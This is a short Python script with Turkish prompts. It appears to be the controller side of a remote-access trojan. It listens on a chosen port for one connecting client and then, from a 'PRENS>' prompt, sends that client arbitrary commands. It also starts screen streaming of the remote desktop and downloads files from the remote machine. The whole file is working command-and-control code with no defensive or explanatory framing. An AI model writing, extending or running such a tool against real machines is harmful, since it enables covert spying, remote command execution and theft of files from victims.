import socket
from colorama import Fore,Back,Style,init
init()

port=int(input("lütfen bağlanmak  istedğiinz port:"))
baglantı=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
baglantı.bind(("0.0.0.0",port))
print("sunucu dinleniyor........")
baglantı.listen(1)
conn,addr=baglantı.accept()
print(conn,addr)

while True:
    emir=input(Fore.RED+"PRENS>"+Fore.RESET)
    


    if emir=="screenshare":
        try:
            from vidstream import StreamingServer
            screen=StreamingServer("0.0.0.0",9090)
            screen.start_server()
        except Exception as e:
            print(e)


    if emir.startswith("download"):
        try:
            conn.settimeout(3.5)

            downloadfile=emir.split()[1]
            conn.send(emir.encode("utf-8"))
            with open(downloadfile,"wb")as file:
                while True:
                    data=conn.recv(16384)
                    if not data:
                        file.close()
                        break

                    file.write(data)
        except socket.timeout:
            print("dosya indirildi")
            continue
        except Exception as e:
            print(e)
  
   
    conn.send(emir.encode("utf-8"))
    response=conn.recv(16384).decode("utf-8")
    
    if response=="yayın durduruldu":
        try:
            screen.stop_server()
            print(response)
        except Exception as e:
            print(e)
            

    print(response)


